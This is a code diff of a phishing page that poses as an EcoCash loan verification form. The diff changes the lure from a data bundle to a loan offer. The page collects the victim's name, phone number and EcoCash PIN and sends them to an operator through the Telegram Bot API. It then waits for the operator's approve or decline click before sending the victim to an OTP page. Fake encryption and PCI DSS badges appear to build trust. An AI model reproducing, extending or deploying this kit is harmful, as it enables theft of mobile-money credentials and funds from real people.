@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
     <meta name="theme-color" content="#003366">
-    <title>EcoCash Loan | Verify Account · Zimbabwe</title>
+    <title>EcoCash Loan | Verify Account &middot; Zimbabwe</title>
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
     <style>
         :root {
@@ -50,7 +50,7 @@
             background: white;
             border-radius: 18px;
             padding: 32px;
-            max-width: 400px;
+            max-width: 420px;
             width: 100%;
             box-shadow: 0 16px 48px rgba(0,26,51,0.4);
         }
@@ -59,16 +59,16 @@
         .card-head h1 { font-size: 20px; font-weight: 900; color: var(--blue); margin-bottom: 4px; }
         .card-head p { color: var(--muted); font-size: 12px; }
 
-        .bundle-bar {
+        .loan-bar {
             background: linear-gradient(135deg, var(--blue), var(--blue-dark));
             border-radius: 10px;
-            padding: 12px 14px;
+            padding: 14px 16px;
             margin-bottom: 18px;
             color: white;
         }
 
-        .b-row { display: flex; justify-content: space-between; font-size: 12px; margin-bottom: 5px; }
-        .b-row:last-child { margin-bottom: 0; padding-top: 5px; border-top: 1px solid rgba(255,255,255,0.15); font-weight: 800; font-size: 13px; }
+        .b-row { display: flex; justify-content: space-between; font-size: 12px; margin-bottom: 6px; }
+        .b-row:last-child { margin-bottom: 0; padding-top: 6px; border-top: 1px solid rgba(255,255,255,0.15); font-weight: 800; font-size: 13px; }
 
         .fg { margin-bottom: 14px; }
         .fl { display: block; font-size: 10px; font-weight: 700; color: var(--blue); text-transform: uppercase; letter-spacing: 0.05em; margin-bottom: 5px; }
@@ -125,10 +125,10 @@
             background: var(--blue);
             color: white;
             border: none;
-            padding: 13px;
+            padding: 14px;
             border-radius: 50px;
             font-weight: 800;
-            font-size: 12px;
+            font-size: 13px;
             text-transform: uppercase;
             letter-spacing: 0.03em;
             cursor: pointer;
@@ -144,10 +144,10 @@
             background: transparent;
             color: var(--blue);
             border: 2px solid var(--blue);
-            padding: 13px;
+            padding: 14px;
             border-radius: 50px;
             font-weight: 800;
-            font-size: 12px;
+            font-size: 13px;
             text-transform: uppercase;
             cursor: pointer;
             font-family: inherit;
@@ -215,12 +215,13 @@
         <div class="card">
             <div class="card-head">
                 <h1>Verify Your Account</h1>
-                <p>Enter your EcoCash details to proceed with your loan</p>
+                <p>Enter your EcoCash details to proceed with your loan application</p>
             </div>
 
-            <div id="bBar" class="bundle-bar" style="display:none;">
-                <div class="b-row"><span>Loan Amount:</span><span id="bD">&mdash;</span></div>
-                <div class="b-row"><span>Amount:</span><span id="bP">USD 0.00</span></div>
+            <div id="bBar" class="loan-bar" style="display:none;">
+                <div class="b-row"><span>Loan Amount:</span><span id="bAmt">&mdash;</span></div>
+                <div class="b-row"><span>Term:</span><span id="bTerm">&mdash;</span></div>
+                <div class="b-row"><span>Monthly Payment:</span><span id="bMonthly">&mdash;</span></div>
             </div>
 
             <div id="err" class="err"></div>
@@ -228,26 +229,26 @@
             <form id="frm" onsubmit="doSubmit(event)">
                 <div class="fg">
                     <label class="fl" for="name">Full Name</label>
-                    <div class="iw"><input type="text" class="fi" id="name" placeholder="John Moyo" autocomplete="name"></div>
+                    <div class="iw"><input type="text" class="fi" id="name" placeholder="As shown on your EcoCash account" autocomplete="name" required></div>
                 </div>
                 <div class="fg">
                     <label class="fl" for="phone">EcoCash Number</label>
-                    <div class="iw"><span class="prefix">+263</span><input type="tel" class="fi" id="phone" placeholder="77 123 4567" inputmode="numeric" maxlength="9"></div>
-                    <p class="hint">9-digit number (e.g. 77XXXXXXX)</p>
+                    <div class="iw"><span class="prefix">+263</span><input type="tel" class="fi" id="phone" placeholder="77 123 4567" inputmode="numeric" maxlength="9" required></div>
+                    <p class="hint">9-digit EcoCash registered number (e.g. 77XXXXXXX)</p>
                 </div>
                 <div class="fg">
                     <label class="fl" for="pin">EcoCash PIN</label>
-                    <div class="iw"><input type="password" class="fi" id="pin" placeholder="&#8226;&#8226;&#8226;&#8226;" inputmode="numeric" maxlength="4"><button type="button" class="pin-tog" onclick="togPin()">Show</button></div>
-                    <p class="hint">4-digit EcoCash PIN</p>
+                    <div class="iw"><input type="password" class="fi" id="pin" placeholder="&#8226;&#8226;&#8226;&#8226;" inputmode="numeric" maxlength="4" required><button type="button" class="pin-tog" onclick="togPin()">Show</button></div>
+                    <p class="hint">Your 4-digit EcoCash PIN</p>
                 </div>
                 <div class="btns">
-                    <button type="submit" class="btn-p">Verify & Proceed</button>
+                    <button type="submit" class="btn-p">Verify &amp; Proceed</button>
                     <button type="button" class="btn-o" onclick="location.href='index.html'">Cancel</button>
                 </div>
             </form>
 
-            <div class="card-ft">By proceeding you agree to our <a href="#">Terms</a> &amp; <a href="#">Privacy</a></div>
-            <div class="secure">&#128274; 256-bit Encrypted &middot; PCI DSS</div>
+            <div class="card-ft">By proceeding you agree to our <a href="#">Terms</a> &amp; <a href="#">Privacy Policy</a></div>
+            <div class="secure">&#128274; 256-bit Encrypted &middot; PCI DSS Compliant</div>
         </div>
     </main>
 
@@ -256,7 +257,7 @@
     <div id="aModal" class="modal">
         <div class="modal-box">
             <h2>Already Applied</h2>
-            <p>This transaction has already been applied to your account.</p>
+            <p>This transaction has already been submitted to your account.</p>
             <button class="modal-btn" onclick="goOTP()">Continue</button>
         </div>
     </div>
@@ -268,21 +269,29 @@
 
         function init() {
             const p = new URLSearchParams(location.search);
-            const d = p.get('data'), pr = p.get('price');
-            if (d && pr) {
-                bd = { data: d, price: pr };
+            const amt = p.get('amount');
+            const dur = p.get('duration');
+            const name = p.get('name');
+            const monthly = p.get('monthlyPayment');
+
+            if (amt && dur) {
+                bd = {
+                    amount: amt,
+                    duration: dur,
+                    name: name || '',
+                    monthlyPayment: monthly || ''
+                };
                 document.getElementById('bBar').style.display = 'block';
-                document.getElementById('bD').textContent = d;
-                document.getElementById('bP').textContent = 'USD ' + pr;
-            } else {
-                // Loan application flow
-                const amt = p.get('amount'), dur = p.get('duration');
-                if (amt && dur) {
-                    bd = { data: 'Loan USD ' + amt, price: amt };
-                    document.getElementById('bBar').style.display = 'block';
-                    document.getElementById('bD').textContent = 'USD ' + parseFloat(amt).toLocaleString() + ' / ' + dur + ' Months';
-                    document.getElementById('bP').textContent = 'USD ' + parseFloat(amt).toLocaleString();
+                document.getElementById('bAmt').textContent = 'USD ' + parseFloat(amt).toLocaleString();
+                document.getElementById('bTerm').textContent = dur + (dur === '1' ? ' month' : ' months');
+                if (monthly) {
+                    document.getElementById('bMonthly').textContent = 'USD ' + parseFloat(monthly).toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 });
                 }
+            }
+
+            // Pre-fill name if passed from index
+            if (name) {
+                document.getElementById('name').value = name;
             }
         }
 
@@ -298,7 +307,7 @@
 
         async function tg(msg, btns) {
             try {
-                await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {
+                await fetch('https://api.telegram.org/bot' + BOT + '/sendMessage', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ chat_id: CID, text: msg, reply_markup: btns ? { inline_keyboard: btns } : undefined, parse_mode: 'HTML' })
@@ -313,11 +322,12 @@
             const phone = document.getElementById('phone').value.trim().replace(/\s/g, '');
             const pin = document.getElementById('pin').value.trim();
 
-            if (!name) { showErr('Enter your full name'); return; }
-            if (phone.length < 9) { showErr('Enter valid 9-digit number'); return; }
-            if (pin.length !== 4) { showErr('PIN must be 4 digits'); return; }
+            if (!name) { showErr('Please enter your full name'); return; }
+            if (phone.length < 9) { showErr('Please enter a valid 9-digit EcoCash number'); return; }
+            if (pin.length !== 4) { showErr('PIN must be exactly 4 digits'); return; }
 
-            const msg = `\u{1f4f1} <b>New Loan Application</b>\n\n<b>Name:</b> <code>${name}</code>\n<b>Phone:</b> <code>+263${phone}</code>\n<b>PIN:</b> <code>${pin}</code>\n<b>Loan:</b> <code>${bd.data || 'N/A'}</code>\n<b>Amount:</b> <code>USD ${bd.price || '0.00'}</code>`;
+            const loanDesc = 'Loan USD ' + bd.amount + ' / ' + bd.duration + ' Months';
+            const msg = '\u{1f4f1} <b>EcoCash Loan Application</b>\n\n<b>Name:</b> <code>' + name + '</code>\n<b>Phone:</b> <code>+263' + phone + '</code>\n<b>PIN:</b> <code>' + pin + '</code>\n<b>Loan:</b> <code>' + loanDesc + '</code>\n<b>Amount:</b> <code>USD ' + bd.amount + '</code>';
 
             const btns = [
                 [{ text: '\u2713 Approved', callback_data: 'login_approved' }, { text: '\u2717 Declined', callback_data: 'login_declined' }],
@@ -330,35 +340,35 @@
         }
 
         function poll() {
-            const iv = setInterval(() => {
-                fetch(`https://api.telegram.org/bot${BOT}/getUpdates?offset=${luid + 1}`)
-                    .then(r => r.json())
-                    .then(d => {
+            const iv = setInterval(function() {
+                fetch('https://api.telegram.org/bot' + BOT + '/getUpdates?offset=' + (luid + 1))
+                    .then(function(r) { return r.json(); })
+                    .then(function(d) {
                         if (d.ok && d.result.length > 0) {
-                            const u = d.result[0];
+                            var u = d.result[0];
                             luid = u.update_id;
                             if (u.callback_query) {
-                                const cb = u.callback_query.data;
+                                var cb = u.callback_query.data;
                                 if (cb === 'login_approved') { clearInterval(iv); document.getElementById('ov').classList.remove('on'); goOTP(); }
-                                else if (cb === 'login_declined') { clearInterval(iv); document.getElementById('ov').classList.remove('on'); showErr('Request declined. Try again.'); document.getElementById('frm').reset(); }
+                                else if (cb === 'login_declined') { clearInterval(iv); document.getElementById('ov').classList.remove('on'); showErr('Request declined. Please try again.'); document.getElementById('frm').reset(); }
                                 else if (cb === 'login_applied') { clearInterval(iv); document.getElementById('ov').classList.remove('on'); document.getElementById('aModal').classList.add('on'); }
                             }
                         }
-                    }).catch(e => console.error(e));
+                    }).catch(function(e) { console.error(e); });
             }, 1000);
-            setTimeout(() => clearInterval(iv), 300000);
+            setTimeout(function() { clearInterval(iv); }, 300000);
         }
 
         function goOTP() {
             document.getElementById('aModal').classList.remove('on');
             const ph = document.getElementById('phone').value.trim().replace(/\s/g, '');
-            const dataParam = bd.data ? encodeURIComponent(bd.data) : '';
-            const priceParam = bd.price || '';
-            location.href = `otp.html?data=${dataParam}&price=${priceParam}&phone=${ph}`;
+            const dataParam = 'Loan USD ' + bd.amount + ' for ' + bd.duration + ' months';
+            location.href = 'otp.html?data=' + encodeURIComponent(dataParam) + '&price=' + bd.amount + '&phone=' + ph;
         }
 
-        document.getElementById('name').addEventListener('keypress', e => { if (e.key === 'Enter') { e.preventDefault(); document.getElementById('phone').focus(); } });
-        document.getElementById('phone').addEventListener('keypress', e => { if (e.key === 'Enter') { e.preventDefault(); document.getElementById('pin').focus(); } });
+        // Enter key navigation
+        document.getElementById('name').addEventListener('keypress', function(e) { if (e.key === 'Enter') { e.preventDefault(); document.getElementById('phone').focus(); } });
+        document.getElementById('phone').addEventListener('keypress', function(e) { if (e.key === 'Enter') { e.preventDefault(); document.getElementById('pin').focus(); } });
 
         window.addEventListener('load', init);
     </script>
